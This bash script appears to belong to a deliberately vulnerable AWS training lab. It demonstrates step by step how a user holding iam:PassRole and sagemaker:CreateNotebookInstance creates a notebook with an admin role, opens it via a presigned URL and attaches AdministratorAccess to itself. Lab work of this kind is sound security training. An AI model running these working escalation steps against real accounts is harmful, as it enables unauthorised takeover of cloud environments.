#!/bin/bash

# Demo script for iam-passrole+sagemaker-createnotebookinstance privilege escalation
# This scenario demonstrates how a user with iam:PassRole and sagemaker:CreateNotebookInstance
# can create a SageMaker notebook instance with an administrative role, then access it via
# a presigned URL to execute commands with elevated privileges.

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-sagemaker-001-to-admin-starting-user"
PASSABLE_ROLE="pl-prod-sagemaker-001-to-admin-passable-role"
NOTEBOOK_NAME="pl-demo-notebook-$(date +%s)"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SageMaker CreateNotebookInstance Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_sagemaker_001_iam_passrole_sagemaker_createnotebookinstance.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(OTEL_TRACES_EXPORTER= terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: List available roles to find the passable admin role
echo -e "${YELLOW}Step 5: Discovering available privileged roles${NC}"
echo "Listing roles (looking for passable admin role)..."
aws iam list-roles --query 'Roles[?contains(RoleName, `passable`)].{Name:RoleName, Arn:Arn}' --output table

ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$PASSABLE_ROLE"
echo ""
echo "Found target role: $PASSABLE_ROLE"
echo "Role ARN: $ROLE_ARN"

# # Verify role has admin permissions
# echo "Checking role permissions..."
# aws iam list-attached-role-policies --role-name $PASSABLE_ROLE --query 'AttachedPolicies[*].PolicyArn' --output table
# echo -e "${GREEN}✓ Discovered passable admin role${NC}\n"

# Step 6: Create SageMaker notebook instance with admin role
echo -e "${YELLOW}Step 6: Creating SageMaker notebook instance with admin role${NC}"
echo "Notebook name: $NOTEBOOK_NAME"
echo "Instance type: ml.t3.medium"
echo "Role: $PASSABLE_ROLE"
echo ""

aws sagemaker create-notebook-instance \
    --region $AWS_REGION \
    --notebook-instance-name $NOTEBOOK_NAME \
    --instance-type ml.t3.medium \
    --role-arn $ROLE_ARN

echo -e "${GREEN}✓ Successfully created notebook instance${NC}\n"

# Step 7: Wait for notebook to reach InService status
echo -e "${YELLOW}Step 7: Waiting for notebook instance to be ready${NC}"
echo "This typically takes 5-8 minutes..."
echo ""

MAX_ATTEMPTS=40  # 40 attempts * 15 seconds = 10 minutes
ATTEMPT=0
STATUS=""

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    STATUS=$(aws sagemaker describe-notebook-instance \
        --region $AWS_REGION \
        --notebook-instance-name $NOTEBOOK_NAME \
        --query 'NotebookInstanceStatus' \
        --output text 2>/dev/null || echo "Unknown")

    if [ "$STATUS" == "InService" ]; then
        echo -e "${GREEN}✓ Notebook instance is ready!${NC}"
        break
    elif [ "$STATUS" == "Failed" ]; then
        echo -e "${RED}✗ Notebook instance creation failed${NC}"
        exit 1
    fi

    ATTEMPT=$((ATTEMPT + 1))
    echo "Status: $STATUS (attempt $ATTEMPT/$MAX_ATTEMPTS)"
    sleep 15
done

if [ "$STATUS" != "InService" ]; then
    echo -e "${RED}✗ Timeout waiting for notebook instance (status: $STATUS)${NC}"
    exit 1
fi
echo ""

# Step 8: Display notebook access options
echo -e "${YELLOW}Step 8: Accessing the notebook instance${NC}"
echo -e "${YELLOW}The SageMaker notebook is now running with admin privileges.${NC}"
echo -e "${YELLOW}You have two options to access it:${NC}\n"

# Option 1: Direct URL (if logged into console)
DIRECT_URL="https://${NOTEBOOK_NAME}.notebook.${AWS_REGION}.sagemaker.aws/tree"
echo -e "${GREEN}Option 1: Direct Notebook URL (if logged into AWS Console)${NC}"
echo -e "${BLUE}$DIRECT_URL${NC}"
echo -e "${YELLOW}Note: This works if you're already authenticated in the AWS Console in your browser${NC}\n"

# Option 2: Presigned URL
echo -e "${GREEN}Option 2: Presigned URL (works without console login)${NC}"
echo "Generating presigned URL (valid for 12 hours)..."
PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
    --region $AWS_REGION \
    --notebook-instance-name $NOTEBOOK_NAME \
    --query 'AuthorizedUrl' \
    --output text)

echo -e "${BLUE}$PRESIGNED_URL${NC}"
echo -e "${GREEN}✓ Successfully generated presigned URL${NC}\n"

# Step 9: Display instructions for manual exploitation
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}MANUAL EXPLOITATION REQUIRED${NC}"
echo -e "${BLUE}========================================${NC}\n"

echo -e "${YELLOW}Follow these steps to complete the privilege escalation:${NC}\n"

echo -e "${GREEN}1. Open either URL above in your browser${NC}\n"

echo -e "${GREEN}2. Once Jupyter opens, click 'New' → 'Terminal' (top right)${NC}\n"

echo -e "${GREEN}3. In the terminal, run the following command to grant admin access to your starting user:${NC}"
echo -e "${BLUE}aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}\n"

echo -e "${GREEN}4. Wait for IAM propagation (about 15 seconds)${NC}\n"

echo -e "${YELLOW}After running the command in Jupyter, press Enter here to continue verification...${NC}"
read -r

# Wait for IAM propagation
echo -e "\n${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}You may need to run the command in Jupyter terminal first${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Listed available roles and found: $PASSABLE_ROLE"
echo "3. Created SageMaker notebook: $NOTEBOOK_NAME"
echo "4. Passed admin role to notebook via iam:PassRole"
echo "5. Generated presigned URL to access Jupyter"
echo "6. Used notebook's admin role to grant admin policy to starting user"
echo "7. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SageMaker notebook instance: $NOTEBOOK_NAME"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Notebook has admin role: $PASSABLE_ROLE"

echo -e "\n${RED}⚠ Warning: The notebook instance is still running and will incur costs!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
